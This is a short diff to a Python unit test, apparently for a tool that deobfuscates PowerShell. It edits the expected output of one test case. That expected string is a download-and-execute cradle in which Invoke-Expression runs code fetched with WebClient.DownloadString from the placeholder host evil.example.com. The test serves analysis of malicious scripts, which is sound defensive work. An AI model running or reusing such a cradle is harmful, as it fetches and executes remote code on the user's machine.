@@ -308,7 +308,8 @@ class TestPs1RealWorldLarge(TestUnitBase):
         lines = test.splitlines()
         self.assertEqual(len(lines), 2)
         self.assertEqual(lines[1],
-            "Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://evil.example.com/boom'))")
+            "$Null = Invoke-Expression "
+            "((New-Object System.Net.WebClient).DownloadString('https://evil.example.com/boom'))")
 
     def test_real_world_04(self):
         data = lzma.decompress(base64.b85decode(
